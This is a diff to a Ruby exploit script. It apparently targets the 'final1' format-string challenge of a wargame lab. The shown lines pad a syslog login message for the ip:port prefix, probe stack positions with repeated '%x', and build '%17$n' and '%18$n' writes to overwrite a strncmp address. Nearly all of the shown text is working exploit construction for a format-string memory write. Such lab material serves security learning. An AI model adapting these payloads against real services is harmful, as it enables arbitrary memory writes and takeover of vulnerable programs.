@@ -53,18 +53,18 @@ the maximum size of ip:port is:
 
 so we will use 24 charachters for padding
 =end
-# this will output a string like: 192.168.215.1,57739
+# this will output a string like: 192.168.215.1:57739
 ip_port = socket.addr[3].to_s + ":" + socket.addr[1].to_s
 puts "> " + ip_port
 socname_padding = "w" * (24 - ip_port.to_s.length)
 
 
 =begin
-to find where to use %x: 
+to find where to use %n: 
   puts read_until_str(socket, "[final1] $ ")
   socket.puts "username " + socname_padding + "ABCD" + "%x"*17
-      puts read_until_str(socket, "[final1] $ ")
-      socket.puts "login ABCD"
+  puts read_until_str(socket, "[final1] $ ")
+  socket.puts "login ABCD"
 
   Mar 25 22:22:12 (none) final1: Login from 192.168.215.1:64392 as 
   [wwwwwABCD8049ee4804a2a0804a220bffff716b7fd7ff4bffff56869676f4c
@@ -92,7 +92,7 @@ we also need to count:
 which is 16 characters
 =end
 offset = 16 + ip_port.length + socname_padding.length
-# xb0 = 176 = 12 + 164  # strncmp_addr.bytesize = 16
+# xb0 = 176 = 12 + 164  # strncmp_addr.bytesize = 12
 xb0 = "%#{164-offset}x" + "%17$n" # choose the 17th argument
 # xff = 255 = 176 + 79
 xff = "%79x" + "%18$n"
